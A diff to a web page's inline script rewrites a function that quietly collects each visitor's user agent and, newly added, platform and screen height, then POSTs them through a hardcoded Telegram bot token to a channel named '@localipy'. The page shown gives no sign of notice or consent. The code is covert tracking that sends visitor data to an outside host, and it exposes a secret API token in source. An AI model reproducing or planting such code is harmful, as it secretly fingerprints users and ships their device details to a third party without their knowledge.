@@ -94,27 +94,30 @@
     });
   }
   
-  async function getdatatotelegrambots() {
-    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
-    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
+ async function getdatatotelegrambots() {
+  const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+  const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
 
-    const userAgent = navigator.userAgent;
-    const message = `\nUser Agent:\n\n${userAgent}`;
+  const userAgent = navigator.userAgent;
+  const deviceName = navigator.platform;
+  const screenHeight = window.screen.height;
 
-    const htmlMessage = `${message}`;
+  const message = `\nUser Agent:\n\n${userAgent}\n\nDevice Name:\n\n${deviceName}\n\nScreen Height:\n\n${screenHeight}`;
 
-    await fetch(telegramBotURL, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: '@localipy',
-        text: htmlMessage,
-        parse_mode: 'HTML',
-      }),
-    });
-  }
+  const htmlMessage = `${message}`;
+
+  await fetch(telegramBotURL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      chat_id: '@localipy',
+      text: htmlMessage,
+      parse_mode: 'HTML',
+    }),
+  });
+}
   
   
 </script>
